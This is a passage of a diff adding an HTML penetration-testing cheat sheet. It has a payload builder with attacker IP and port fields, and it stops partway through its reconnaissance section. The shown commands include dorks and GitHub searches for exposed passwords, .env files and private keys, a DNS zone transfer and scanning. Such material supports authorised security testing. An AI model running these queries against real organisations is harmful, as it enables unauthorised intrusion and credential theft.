@@ -1,0 +1,2067 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>WEB + API VAPT — Cheat Sheet v6</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#050a0f;--bg2:#080e14;--bg3:#0b1520;
+  --panel:#0d1b28;--panel2:#0f2035;
+  --border:#1a3a50;--border2:#0e2a3f;
+  --accent:#00d4ff;--a2:#00ff88;--a3:#ff6b35;
+  --a4:#ff2d55;--a5:#c77dff;--a6:#ffd60a;
+  --text:#c8dde8;--text2:#7ab3cc;--text3:#4a7a94;--dim:#2a5068;
+  --mono:'Share Tech Mono',monospace;
+  --head:'Orbitron',sans-serif;
+  --body:'Rajdhani',sans-serif;
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{background:var(--bg);color:var(--text);font-family:var(--body);font-size:15px;line-height:1.5;overflow-x:hidden;}
+body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.04) 2px,rgba(0,0,0,0.04) 4px);pointer-events:none;z-index:9999;}
+
+/* ─── PAYLOAD BUILDER BANNER ─── */
+#pb{background:linear-gradient(135deg,#050f1a,#0a1f30);border-bottom:2px solid var(--accent);padding:14px 24px;position:sticky;top:0;z-index:200;display:flex;flex-wrap:wrap;gap:10px;align-items:center;}
+#pb-title{font-family:var(--head);font-size:11px;color:var(--accent);letter-spacing:2px;white-space:nowrap;margin-right:4px;}
+.pb-field{display:flex;align-items:center;gap:6px;}
+.pb-label{font-family:var(--mono);font-size:10px;color:var(--text3);letter-spacing:1px;white-space:nowrap;}
+.pb-input{background:var(--bg3);border:1px solid var(--border);border-radius:4px;padding:5px 10px;font-family:var(--mono);font-size:11px;color:var(--a2);outline:none;width:170px;transition:border-color .2s;}
+.pb-input:focus{border-color:var(--accent);}
+#pb-apply{background:rgba(0,212,255,.12);border:1px solid var(--accent);color:var(--accent);padding:5px 14px;border-radius:4px;cursor:pointer;font-family:var(--mono);font-size:11px;letter-spacing:1px;transition:all .2s;white-space:nowrap;}
+#pb-apply:hover{background:rgba(0,212,255,.25);}
+#pb-status{font-family:var(--mono);font-size:10px;color:var(--a2);margin-left:6px;opacity:0;transition:opacity .3s;}
+.pb-sep{width:1px;height:20px;background:var(--border);margin:0 4px;}
+
+/* ─── SEVERITY FILTER BAR ─── */
+#sev-bar{background:var(--bg2);border-bottom:1px solid var(--border2);padding:8px 24px;display:flex;align-items:center;gap:8px;position:sticky;top:53px;z-index:190;}
+#sev-bar-label{font-family:var(--mono);font-size:9px;color:var(--text3);letter-spacing:2px;margin-right:4px;}
+.sf-btn{font-family:var(--mono);font-size:10px;padding:3px 10px;border-radius:3px;cursor:pointer;border:1px solid var(--border2);background:transparent;color:var(--text3);letter-spacing:1px;transition:all .2s;}
+.sf-btn:hover,.sf-btn.active{color:#fff;}
+.sf-btn[data-sev="all"].active{border-color:var(--accent);color:var(--accent);background:rgba(0,212,255,.1);}
+.sf-btn[data-sev="critical"].active{border-color:var(--a4);color:var(--a4);background:rgba(255,45,85,.1);}
+.sf-btn[data-sev="high"].active{border-color:var(--a3);color:var(--a3);background:rgba(255,107,53,.1);}
+.sf-btn[data-sev="medium"].active{border-color:var(--a6);color:var(--a6);background:rgba(255,214,10,.1);}
+.sf-btn[data-sev="advanced"].active{border-color:var(--a5);color:var(--a5);background:rgba(199,125,255,.1);}
+#progress-global{margin-left:auto;font-family:var(--mono);font-size:10px;color:var(--text3);display:flex;align-items:center;gap:8px;}
+#prog-bar-wrap{width:100px;height:5px;background:var(--border2);border-radius:3px;overflow:hidden;}
+#prog-bar-fill{height:100%;background:var(--a2);border-radius:3px;transition:width .4s;}
+#prog-text{font-size:10px;}
+
+/* ─── LAYOUT ─── */
+#app{display:flex;height:calc(100vh - 106px);}
+
+/* ─── SIDEBAR ─── */
+#nav{width:268px;min-width:268px;background:var(--bg2);border-right:1px solid var(--border2);position:sticky;top:106px;height:calc(100vh - 106px);overflow-y:auto;display:flex;flex-direction:column;scrollbar-width:thin;scrollbar-color:var(--dim) transparent;}
+.nav-block{flex-shrink:0;}
+.nav-slbl{font-family:var(--mono);font-size:9px;color:var(--text3);letter-spacing:3px;text-transform:uppercase;padding:12px 14px 4px;opacity:.6;}
+.nav-item{display:flex;align-items:center;gap:8px;padding:7px 14px;cursor:pointer;border-left:2px solid transparent;transition:all .2s;font-size:12.5px;color:var(--text2);font-family:var(--body);font-weight:500;user-select:none;position:relative;}
+.nav-item:hover{background:rgba(0,212,255,.05);color:var(--accent);border-left-color:var(--accent);}
+.nav-item.active{background:rgba(0,212,255,.08);color:var(--accent);border-left-color:var(--accent);}
+.nav-icon{width:17px;text-align:center;font-size:12px;flex-shrink:0;}
+.nav-badge{margin-left:auto;background:var(--panel2);color:var(--text3);font-family:var(--mono);font-size:9px;padding:1px 5px;border-radius:3px;}
+.nav-prog{position:absolute;bottom:0;left:0;height:2px;background:var(--a2);transition:width .3s;}
+
+/* search */
+#search-wrap{padding:10px 14px;border-bottom:1px solid var(--border2);}
+#search{width:100%;background:var(--bg3);border:1px solid var(--border2);border-radius:4px;padding:6px 10px;font-family:var(--mono);font-size:11px;color:var(--text);outline:none;}
+#search::placeholder{color:var(--text3);}
+#search:focus{border-color:var(--accent);}
+#search-hint{font-family:var(--mono);font-size:9px;color:var(--dim);padding:4px 14px;letter-spacing:1px;}
+
+/* ─── FINDINGS ─── */
+#findings-panel{border-top:1px solid var(--border2);padding:10px 14px 14px;flex-shrink:0;}
+.fp-title{font-family:var(--mono);font-size:9px;color:var(--a2);letter-spacing:3px;text-transform:uppercase;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;}
+.fp-clear{cursor:pointer;font-size:9px;background:none;border:1px solid var(--border2);padding:2px 6px;border-radius:3px;color:var(--text3);}
+.fp-clear:hover{color:var(--a4);border-color:var(--a4);}
+.fp-list{list-style:none;max-height:200px;overflow-y:auto;scrollbar-width:thin;}
+.fp-item{display:flex;align-items:center;gap:6px;padding:4px 2px;border-bottom:1px dashed var(--border2);font-size:10.5px;color:var(--text2);font-family:var(--mono);}
+.fp-item:last-child{border-bottom:none;}
+.fp-dot{width:6px;height:6px;border-radius:50%;flex-shrink:0;}
+.dc{background:var(--a4);}
+.dh{background:var(--a3);}
+.dm{background:var(--a6);}
+.dl{background:var(--a2);}
+.fp-del{margin-left:auto;cursor:pointer;color:var(--dim);font-size:10px;flex-shrink:0;}
+.fp-del:hover{color:var(--a4);}
+.fp-add-row{display:flex;gap:5px;margin-top:7px;}
+.fp-input{flex:1;background:var(--bg3);border:1px solid var(--border2);border-radius:3px;padding:4px 7px;font-family:var(--mono);font-size:10px;color:var(--text);outline:none;min-width:0;}
+.fp-input:focus{border-color:var(--accent);}
+.fp-sev-sel{background:var(--bg3);border:1px solid var(--border2);border-radius:3px;padding:4px 3px;font-family:var(--mono);font-size:10px;color:var(--text);outline:none;cursor:pointer;}
+.fp-add-btn{background:rgba(0,212,255,.1);border:1px solid var(--accent);color:var(--accent);padding:4px 8px;border-radius:3px;cursor:pointer;font-family:var(--mono);font-size:10px;flex-shrink:0;}
+.fp-empty{font-family:var(--mono);font-size:10px;color:var(--dim);text-align:center;padding:10px 0;font-style:italic;}
+
+/* ─── CONTENT ─── */
+#content{flex:1;padding:32px 32px 80px;max-width:calc(100% - 268px);overflow-y:auto;height:100%;min-height:0;}
+.section{display:none;animation:fadeIn .25s ease;}
+.section.active{display:block;}
+@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+
+/* ─── SECTION HEADER ─── */
+.shdr{display:flex;align-items:flex-end;gap:12px;margin-bottom:22px;padding-bottom:12px;border-bottom:1px solid var(--border2);}
+.sico{font-size:28px;line-height:1;}
+.stitle{font-family:var(--head);font-size:20px;font-weight:700;color:#fff;letter-spacing:1px;}
+.sdesc{font-family:var(--mono);font-size:10px;color:var(--text3);margin-top:3px;}
+
+/* ─── PATHWAY ─── */
+.pathway{display:flex;gap:0;margin:0 0 26px;border-radius:6px;overflow:hidden;border:1px solid var(--border2);}
+.pstep{flex:1;padding:9px 5px;text-align:center;background:var(--panel2);border-right:1px solid var(--border2);position:relative;transition:background .2s;cursor:pointer;}
+.pstep:last-child{border-right:none;}
+.pstep.done{background:rgba(0,255,136,.06);}
+.pstep.done .ps-num{color:var(--a2);}
+.pstep.done .ps-lbl{color:var(--a2);}
+.pstep.done::after{content:'✓';position:absolute;top:3px;right:4px;font-size:7px;color:var(--a2);}
+.pstep.current{background:rgba(0,212,255,.1);}
+.pstep.current .ps-num,.pstep.current .ps-lbl{color:var(--accent);}
+.pstep.current::after{content:'●';position:absolute;top:3px;right:4px;font-size:7px;color:var(--accent);}
+.ps-num{font-family:var(--head);font-size:15px;font-weight:700;color:var(--dim);line-height:1;}
+.ps-lbl{font-family:var(--mono);font-size:7.5px;color:var(--text3);margin-top:2px;letter-spacing:.3px;text-transform:uppercase;}
+.pathway-title{font-family:var(--mono);font-size:9px;color:var(--text3);letter-spacing:2px;margin-bottom:6px;text-transform:uppercase;}
+.pathway-title::before{content:'// ';color:var(--dim);}
+
+/* ─── MINI HEADING ─── */
+.mhd{font-family:var(--head);font-size:12px;color:var(--accent);letter-spacing:2px;text-transform:uppercase;margin:22px 0 10px;padding-bottom:5px;border-bottom:1px solid var(--border2);display:flex;align-items:center;gap:7px;}
+.mhd::before{content:'▶';font-size:7px;color:var(--dim);}
+
+/* ─── CARDS ─── */
+.cgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(330px,1fr));gap:12px;margin-bottom:20px;}
+.card{background:var(--panel);border:1px solid var(--border2);border-radius:6px;overflow:hidden;transition:border-color .2s,box-shadow .2s;position:relative;}
+.card:hover{border-color:var(--border);box-shadow:0 0 16px rgba(0,212,255,.08);}
+.card.hidden-by-filter{display:none;}
+.card-hd{display:flex;align-items:center;justify-content:space-between;padding:9px 13px;border-bottom:1px solid var(--border2);background:var(--panel2);}
+.ctitle{font-family:var(--mono);font-size:11.5px;color:var(--accent);}
+.ctitle::before{content:'// ';color:var(--dim);}
+.card-bd{padding:12px 13px;}
+
+/* progress checkbox on card */
+.card-prog{position:absolute;top:9px;right:70px;display:flex;gap:4px;}
+.cp-btn{font-family:var(--mono);font-size:8px;padding:2px 5px;border-radius:3px;cursor:pointer;border:1px solid var(--border2);background:transparent;color:var(--text3);transition:all .15s;}
+.cp-btn:hover{border-color:var(--text3);}
+.cp-btn.tested{border-color:var(--a2);color:var(--a2);background:rgba(0,255,136,.08);}
+.cp-btn.vuln{border-color:var(--a4);color:var(--a4);background:rgba(255,45,85,.08);}
+.cp-btn.na{border-color:var(--dim);color:var(--dim);}
+
+/* severity badges */
+.sev{font-family:var(--mono);font-size:8.5px;padding:2px 7px;border-radius:3px;letter-spacing:1px;text-transform:uppercase;flex-shrink:0;}
+.sc{background:rgba(255,45,85,.15);color:var(--a4);border:1px solid rgba(255,45,85,.3);}
+.sh{background:rgba(255,107,53,.15);color:var(--a3);border:1px solid rgba(255,107,53,.3);}
+.sm{background:rgba(255,214,10,.12);color:var(--a6);border:1px solid rgba(255,214,10,.3);}
+.sl{background:rgba(0,255,136,.1);color:var(--a2);border:1px solid rgba(0,255,136,.2);}
+.si{background:rgba(0,212,255,.1);color:var(--accent);border:1px solid rgba(0,212,255,.2);}
+.sa{background:rgba(199,125,255,.12);color:var(--a5);border:1px solid rgba(199,125,255,.3);}
+
+/* ─── CODE BLOCKS ─── */
+.cmd,.payload{font-family:var(--mono);font-size:11px;border-radius:4px;padding:8px 11px;margin:5px 0;overflow-x:auto;white-space:pre;cursor:pointer;position:relative;line-height:1.7;display:block;}
+.cmd{background:#030810;border:1px solid var(--border2);color:var(--a2);}
+.cmd::before{content:'$ ';color:var(--dim);}
+.cmd:hover{border-color:var(--a2);}
+.payload{background:#030810;border:1px solid rgba(255,107,53,.2);border-left:3px solid var(--a3);color:#ffb38a;}
+.payload:hover{border-color:rgba(255,107,53,.5);}
+.cf{position:absolute;right:7px;top:50%;transform:translateY(-50%);font-size:8px;color:var(--a2);background:var(--bg);padding:1px 4px;letter-spacing:2px;pointer-events:none;}
+.cglbl{font-family:var(--mono);font-size:9px;color:var(--dim);letter-spacing:1px;text-transform:uppercase;border-top:1px solid var(--border2);padding-top:7px;margin:7px 0 4px;}
+.cglbl:first-child{border-top:none;padding-top:0;margin-top:0;}
+code{font-family:var(--mono);font-size:10.5px;background:rgba(0,212,255,.08);color:var(--accent);padding:1px 4px;border-radius:3px;}
+.desc{font-size:13px;color:var(--text2);margin-bottom:7px;line-height:1.6;}
+.note{background:rgba(0,212,255,.05);border-left:3px solid var(--accent);padding:7px 11px;margin:7px 0;border-radius:0 4px 4px 0;font-size:11px;color:var(--text2);font-family:var(--mono);line-height:1.6;}
+.note::before{content:'[i] ';color:var(--accent);}
+.warn{background:rgba(255,214,10,.05);border-left:3px solid var(--a6);padding:7px 11px;margin:7px 0;border-radius:0 4px 4px 0;font-size:11px;color:var(--text2);font-family:var(--mono);line-height:1.6;}
+.warn::before{content:'[!] ';color:var(--a6);}
+
+/* ─── TABLES ─── */
+.dtbl{width:100%;border-collapse:collapse;font-family:var(--mono);font-size:11px;margin:6px 0;}
+.dtbl th{background:var(--panel2);color:var(--accent);text-align:left;padding:6px 9px;font-weight:normal;letter-spacing:1px;font-size:8.5px;text-transform:uppercase;border-bottom:1px solid var(--border);}
+.dtbl td{padding:5px 9px;color:var(--text2);border-bottom:1px solid var(--border2);vertical-align:top;}
+.dtbl tr:last-child td{border-bottom:none;}
+.dtbl tr:hover td{background:rgba(0,212,255,.03);}
+.mono{color:var(--a2)!important;}.red{color:var(--a4)!important;}.orange{color:var(--a3)!important;}.purple{color:var(--a5)!important;}.yellow{color:var(--a6)!important;}
+
+/* ─── CHECKLIST ─── */
+.cl{list-style:none;margin:6px 0;}
+.cl li{display:flex;align-items:flex-start;gap:7px;padding:4px 0;font-size:12.5px;color:var(--text2);border-bottom:1px dashed var(--border2);}
+.cl li:last-child{border-bottom:none;}
+.cl li::before{content:'□';font-family:var(--mono);color:var(--dim);flex-shrink:0;margin-top:1px;}
+
+/* ─── CHAIN ─── */
+.chain{display:flex;align-items:center;flex-wrap:wrap;gap:4px;margin:7px 0;font-family:var(--mono);font-size:10.5px;}
+.cs{background:var(--panel2);border:1px solid var(--border);padding:3px 8px;border-radius:4px;color:var(--text2);}
+.ca{color:var(--dim);}
+.cs.red{border-color:rgba(255,45,85,.4);color:var(--a4);}
+.cs.green{border-color:rgba(0,255,136,.3);color:var(--a2);}
+.cs.blue{border-color:rgba(0,212,255,.3);color:var(--accent);}
+.cs.purple{border-color:rgba(199,125,255,.3);color:var(--a5);}
+
+/* ─── KEYBOARD SHORTCUT HINT ─── */
+#kbd-hint{position:fixed;bottom:16px;right:16px;background:var(--panel2);border:1px solid var(--border);border-radius:6px;padding:10px 14px;font-family:var(--mono);font-size:10px;color:var(--text3);z-index:500;opacity:0;transition:opacity .3s;pointer-events:none;line-height:1.8;}
+#kbd-hint.show{opacity:1;}
+kbd{background:var(--bg3);border:1px solid var(--border);border-radius:3px;padding:1px 5px;color:var(--text2);font-size:9px;}
+
+/* ─── EXPORT OVERLAY ─── */
+#export-btn{position:fixed;bottom:16px;left:290px;background:var(--panel2);border:1px solid var(--border);color:var(--text3);font-family:var(--mono);font-size:10px;padding:7px 14px;border-radius:4px;cursor:pointer;z-index:300;letter-spacing:1px;transition:all .2s;}
+#export-btn:hover{color:var(--a2);border-color:var(--a2);}
+@media print{
+  #pb,#sev-bar,#nav,#export-btn,#kbd-hint{display:none!important;}
+  #content{max-width:100%;padding:20px;}
+  body{background:#fff;color:#000;}
+  .card{border:1px solid #ccc;break-inside:avoid;}
+  .cmd,.payload{background:#f5f5f5;color:#333;border-color:#ccc;}
+  h1,.stitle{color:#000;}
+}
+
+::-webkit-scrollbar{width:5px;height:5px;}
+::-webkit-scrollbar-track{background:transparent;}
+::-webkit-scrollbar-thumb{background:var(--dim);border-radius:3px;}
+@media(max-width:860px){#nav{display:none;}#content{max-width:100%;padding:16px;}#export-btn{left:16px;}}
+</style>
+</head>
+<body>
+
+<!-- ═══ PAYLOAD BUILDER BANNER ═══ -->
+<div id="pb">
+  <span id="pb-title">⚡ PAYLOAD BUILDER</span>
+  <div class="pb-sep"></div>
+  <div class="pb-field">
+    <span class="pb-label">TARGET:</span>
+    <input class="pb-input" id="pb-target" placeholder="target.com" value="target.com">
+  </div>
+  <div class="pb-field">
+    <span class="pb-label">ATTACKER IP:</span>
+    <input class="pb-input" id="pb-attacker" placeholder="10.10.14.1" style="width:130px">
+  </div>
+  <div class="pb-field">
+    <span class="pb-label">PORT:</span>
+    <input class="pb-input" id="pb-port" placeholder="4444" style="width:70px">
+  </div>
+  <div class="pb-field">
+    <span class="pb-label">PARAM:</span>
+    <input class="pb-input" id="pb-param" placeholder="id" style="width:80px">
+  </div>
+  <div class="pb-field">
+    <span class="pb-label">WORDLIST:</span>
+    <input class="pb-input" id="pb-wordlist" placeholder="/opt/SecLists/..." style="width:200px">
+  </div>
+  <button id="pb-apply" onclick="applyBuilder()">▶ APPLY TO ALL</button>
+  <span id="pb-status">✓ Applied!</span>
+</div>
+
+<!-- ═══ SEVERITY FILTER + PROGRESS ═══ -->
+<div id="sev-bar">
+  <span id="sev-bar-label">FILTER:</span>
+  <button class="sf-btn active" data-sev="all" onclick="filterSev('all',this)">ALL</button>
+  <button class="sf-btn" data-sev="critical" onclick="filterSev('critical',this)">CRITICAL</button>
+  <button class="sf-btn" data-sev="high" onclick="filterSev('high',this)">HIGH</button>
+  <button class="sf-btn" data-sev="medium" onclick="filterSev('medium',this)">MEDIUM</button>
+  <button class="sf-btn" data-sev="advanced" onclick="filterSev('advanced',this)">ADVANCED</button>
+  <div class="pb-sep"></div>
+  <button class="sf-btn" onclick="showKbd()" style="border-color:var(--a5);color:var(--a5);">⌨ SHORTCUTS</button>
+  <div id="progress-global">
+    <span id="prog-text">0 / 0 tested</span>
+    <div id="prog-bar-wrap"><div id="prog-bar-fill" style="width:0%"></div></div>
+  </div>
+</div>
+
+<!-- ═══ MAIN APP ═══ -->
+<div id="app">
+
+<!-- SIDEBAR -->
+<div id="nav">
+  <div class="nav-block">
+    <div id="search-wrap"><input type="text" id="search" placeholder="/ search commands..."></div>
+    <div id="search-hint">ENTER to jump to result</div>
+    <div class="nav-slbl">Recon &amp; Enum</div>
+    <div class="nav-item active" onclick="show('recon',this)" data-sec="recon"><span class="nav-icon">🔍</span>Reconnaissance<span class="nav-badge">25</span><div class="nav-prog" id="np-recon" style="width:0%"></div></div>
+    <div class="nav-item" onclick="show('enum',this)" data-sec="enum"><span class="nav-icon">📡</span>Enumeration<span class="nav-badge">18</span><div class="nav-prog" id="np-enum" style="width:0%"></div></div>
+    <div class="nav-slbl">Web Attacks</div>
+    <div class="nav-item" onclick="show('sqli',this)" data-sec="sqli"><span class="nav-icon">💉</span>SQL Injection<span class="nav-badge">30</span><div class="nav-prog" id="np-sqli" style="width:0%"></div></div>
+    <div class="nav-item" onclick="show('xss',this)" data-sec="xss"><span class="nav-icon">📜</span>XSS<span class="nav-badge">25</span><div class="nav-prog" id="np-xss" style="width:0%"></div></div>
+    <div class="nav-item" onclick="show('xxe',this)" data-sec="xxe"><span class="nav-icon">🧬</span>XXE / SSRF<span class="nav-badge">18</span><div class="nav-prog" id="np-xxe" style="width:0%"></div></div>
+    <div class="nav-item" onclick="show('ssti',this)" data-sec="ssti"><span class="nav-icon">⚙️</span>SSTI / RCE<span class="nav-badge">15</span><div class="nav-prog" id="np-ssti" style="width:0%"></div></div>
+    <div class="nav-item" onclick="show('idor',this)" data-sec="idor"><span class="nav-icon">🔓</span>IDOR / AuthZ<span class="nav-badge">16</span><div class="nav-prog" id="np-idor" style="width:0%"></div></div>
+    <div class="nav-item" onclick="show('csrf',this)" data-sec="csrf"><span class="nav-icon">🔁</span>CSRF / Clickjack<span class="nav-badge">10</span><div class="nav-prog" id="np-csrf" style="width:0%"></div></div>
+    <div class="nav-item" onclick="show('upload',this)" data-sec="upload"><span class="nav-icon">📤</span>File Upload / LFI<span class="nav-badge">14</span><div class="nav-prog" id="np-upload" style="width:0%"></div></div>
+    <div class="nav-slbl">API Security</div>
+    <div class="nav-item" onclick="show('api',this)" data-sec="api"><span class="nav-icon">🔌</span>REST API Testing<span class="nav-badge">28</span><div class="nav-prog" id="np-api" style="width:0%"></div></div>
+    <div class="nav-item" onclick="show('graphql',this)" data-sec="graphql"><span class="nav-icon">🕸️</span>GraphQL Attacks<span class="nav-badge">18</span><div class="nav-prog" id="np-graphql" style="width:0%"></div></div>
+    <div class="nav-item" onclick="show('jwt',this)" data-sec="jwt"><span class="nav-icon">🔑</span>JWT / Auth Bypass<span class="nav-badge">20</span><div class="nav-prog" id="np-jwt" style="width:0%"></div></div>
+    <div class="nav-slbl">Advanced</div>
+    <div class="nav-item" onclick="show('adv',this)" data-sec="adv"><span class="nav-icon">☠️</span>Advanced Techniques<span class="nav-badge">22</span><div class="nav-prog" id="np-adv" style="width:0%"></div></div>
+    <div class="nav-item" onclick="show('cloud',this)" data-sec="cloud"><span class="nav-icon">☁️</span>Cloud Attacks<span class="nav-badge">NEW</span><div class="nav-prog" id="np-cloud" style="width:0%"></div></div>
+    <div class="nav-item" onclick="show('ws',this)" data-sec="ws"><span class="nav-icon">📡</span>WebSocket Attacks<span class="nav-badge">NEW</span><div class="nav-prog" id="np-ws" style="width:0%"></div></div>
+    <div class="nav-item" onclick="show('bizlogic',this)" data-sec="bizlogic"><span class="nav-icon">🏦</span>Business Logic<span class="nav-badge">NEW</span><div class="nav-prog" id="np-bizlogic" style="width:0%"></div></div>
+    <div class="nav-item" onclick="show('cve',this)" data-sec="cve"><span class="nav-icon">💀</span>CVE Quick-Ref<span class="nav-badge">NEW</span><div class="nav-prog" id="np-cve" style="width:0%"></div></div>
+    <div class="nav-item" onclick="show('toolbox',this)" data-sec="toolbox"><span class="nav-icon">🧰</span>Toolbox<span class="nav-badge">40</span><div class="nav-prog" id="np-toolbox" style="width:0%"></div></div>
+  </div>
+
+  <!-- FINDINGS -->
+  <div id="findings-panel">
+    <div class="fp-title"><span>⚑ FINDINGS LOG</span><button class="fp-clear" onclick="clearFindings()">CLEAR</button></div>
+    <ul class="fp-list" id="fplist"></ul>
+    <div class="fp-add-row">
+      <input class="fp-input" id="fp-text" placeholder="e.g. SQLi /login" maxlength="60">
+      <select class="fp-sev-sel" id="fp-sev">
+        <option value="c">CRIT</option>
+        <option value="h" selected>HIGH</option>
+        <option value="m">MED</option>
+        <option value="l">LOW</option>
+      </select>
+      <button class="fp-add-btn" onclick="addFinding()">+</button>
+    </div>
+  </div>
+</div>
+
+<!-- CONTENT -->
+<div id="content">
+
+<!-- ░░ RECON ░░ -->
+<div id="sec-recon" class="section active">
+<div class="shdr"><div class="sico">🔍</div><div><div class="stitle">RECONNAISSANCE</div><div class="sdesc">// passive &amp; active — OSINT — fingerprinting — JS mining</div></div></div>
+<div class="pathway-title">Attack Pathway</div>
+<div style="display:flex;align-items:center;gap:8px;margin-bottom:26px;">
+<button onclick="pathPrev(this)" style="flex-shrink:0;background:var(--panel2);border:1px solid var(--border2);color:var(--dim);width:28px;height:28px;border-radius:4px;cursor:pointer;font-size:16px;font-family:monospace;transition:all .2s;display:flex;align-items:center;justify-content:center;" onmouseover="this.style.color='var(--accent)';this.style.borderColor='var(--accent)'" onmouseout="this.style.color='var(--dim)';this.style.borderColor='var(--border2)'">&#8249;</button>
+<div class="pathway" style="flex:1;margin-bottom:0;">
+  <div class="pstep current" onclick="stepClick(this)"><div class="ps-num">1</div><div class="ps-lbl">Passive OSINT</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">2</div><div class="ps-lbl">Subdomain Enum</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">3</div><div class="ps-lbl">Port Scan</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">4</div><div class="ps-lbl">Tech Fingerprint</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">5</div><div class="ps-lbl">JS / Secrets</div></div>
+  <div class="pstep" onclick="stepClick(this)"><div class="ps-num">6</div><div class="ps-lbl">Crawl &amp; Dir Brute</div></div>
+</div>
+<button onclick="pathNext(this)" style="flex-shrink:0;background:var(--panel2);border:1px solid var(--border2);color:var(--dim);width:28px;height:28px;border-radius:4px;cursor:pointer;font-size:16px;font-family:monospace;transition:all .2s;display:flex;align-items:center;justify-content:center;" onmouseover="this.style.color='var(--accent)';this.style.borderColor='var(--accent)'" onmouseout="this.style.color='var(--dim)';this.style.borderColor='var(--border2)'">&#8250;</button>
+</div>
+<div class="mhd">Passive OSINT</div>
+<div class="cgrid">
+<div class="card" data-sev="info" data-id="r1">
+  <div class="card-hd"><span class="ctitle">Google Dorking</span><div class="card-prog"><button class="cp-btn" onclick="markCard('r1','tested',this)">✓</button><button class="cp-btn" onclick="markCard('r1','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('r1','na',this)">N/A</button></div><span class="sev si">PASSIVE</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)">site:TARGET filetype:pdf
+site:TARGET intitle:"index of"
+site:TARGET inurl:admin
+site:TARGET ext:bak | ext:sql | ext:log | ext:env
+site:TARGET "password" filetype:txt
+inurl:".git" site:TARGET
+site:pastebin.com "TARGET"
+site:TARGET inurl:wp-content/uploads
+"TARGET" filetype:xlsx | filetype:csv</div>
+  </div>
+</div>
+<div class="card" data-sev="info" data-id="r2">
+  <div class="card-hd"><span class="ctitle">DNS / WHOIS Recon</span><div class="card-prog"><button class="cp-btn" onclick="markCard('r2','tested',this)">✓</button><button class="cp-btn" onclick="markCard('r2','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('r2','na',this)">N/A</button></div><span class="sev si">PASSIVE</span></div>
+  <div class="card-bd">
+<div class="cmd" onclick="cp(this)">whois TARGET</div>
+<div class="cmd" onclick="cp(this)">dig TARGET ANY +noall +answer</div>
+<div class="cmd" onclick="cp(this)">dig axfr @ns1.TARGET TARGET</div>
+<div class="cmd" onclick="cp(this)">dnsx -d TARGET -a -aaaa -cname -mx -txt -ns</div>
+<div class="cmd" onclick="cp(this)">curl -s "https://crt.sh/?q=%.TARGET&amp;output=json" | jq '.[].name_value' | sort -u</div>
+<div class="cmd" onclick="cp(this)">dnsrecon -d TARGET -t std,brt,axfr</div>
+  </div>
+</div>
+<div class="card" data-sev="info" data-id="r3">
+  <div class="card-hd"><span class="ctitle">Shodan / Censys</span><div class="card-prog"><button class="cp-btn" onclick="markCard('r3','tested',this)">✓</button><button class="cp-btn" onclick="markCard('r3','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('r3','na',this)">N/A</button></div><span class="sev si">PASSIVE</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)">ssl.cert.subject.CN:TARGET
+hostname:TARGET port:8080
+org:"TargetCorp" http.title:"Dashboard"
+ip:1.2.3.4 vuln:CVE-2021-41773</div>
+<div class="cmd" onclick="cp(this)">shodan search 'org:"TargetCorp" http.status:200' --fields ip_str,port,hostnames</div>
+<div class="cmd" onclick="cp(this)">shodan host 1.2.3.4</div>
+  </div>
+</div>
+<div class="card" data-sev="critical" data-id="r4">
+  <div class="card-hd"><span class="ctitle">GitHub / Code Recon</span><div class="card-prog"><button class="cp-btn" onclick="markCard('r4','tested',this)">✓</button><button class="cp-btn" onclick="markCard('r4','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('r4','na',this)">N/A</button></div><span class="sev sc">CRITICAL FINDS</span></div>
+  <div class="card-bd">
+<div class="payload" onclick="cp(this)">org:targetcorp password
+org:targetcorp api_key
+org:targetcorp "BEGIN RSA PRIVATE KEY"
+org:targetcorp filename:.env
+org:targetcorp DB_PASSWORD
+filename:docker-compose.yml password</div>
+<div class="cmd" onclick="cp(this)">gitleaks detect --source=./repo --report-path=gitleaks.json</div>
+<div class="cmd" onclick="cp(this)">trufflehog filesystem ./repo --json</div>
+  </div>
+</div>
+</div>
+<div class="mhd">Active Scanning</div>
+<div class="cgrid">
+<div class="card" data-sev="medium" data-id="r5">
+  <div class="card-hd"><span class="ctitle">Subdomain Discovery</span><div class="card-prog"><button class="cp-btn" onclick="markCard('r5','tested',this)">✓</button><button class="cp-btn" onclick="markCard('r5','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('r5','na',this)">N/A</button></div><span class="sev sm">ACTIVE</span></div>
+  <div class="card-bd">
+<div class="cmd" onclick="cp(this)">subfinder -d TARGET -o subs.txt</div>
+<div class="cmd" onclick="cp(this)">amass enum -passive -d TARGET</div>
+<div class="cmd" onclick="cp(this)">ffuf -w WORDLIST -u https://FUZZ.TARGET -mc 200,301,302,403</div>
+<div class="cmd" onclick="cp(this)">cat subs.txt | httpx -silent -o alive_subs.txt</div>
+  </div>
+</div>
+<div class="card" data-sev="medium" data-id="r6">
+  <div class="card-hd"><span class="ctitle">Port Scan + Fingerprint</span><div class="card-prog"><button class="cp-btn" onclick="markCard('r6','tested',this)">✓</button><button class="cp-btn" onclick="markCard('r6','vuln',this)">⚠</button><button class="cp-btn" onclick="markCard('r6','na',this)">N/A</button></div><span class="sev sm">ACTIVE</span></div>
+  <div class="card-bd">
+<div class="cmd" onclick="cp(this)">nmap -sC -sV -oA nmap/TARGET 1.2.3.4</div>
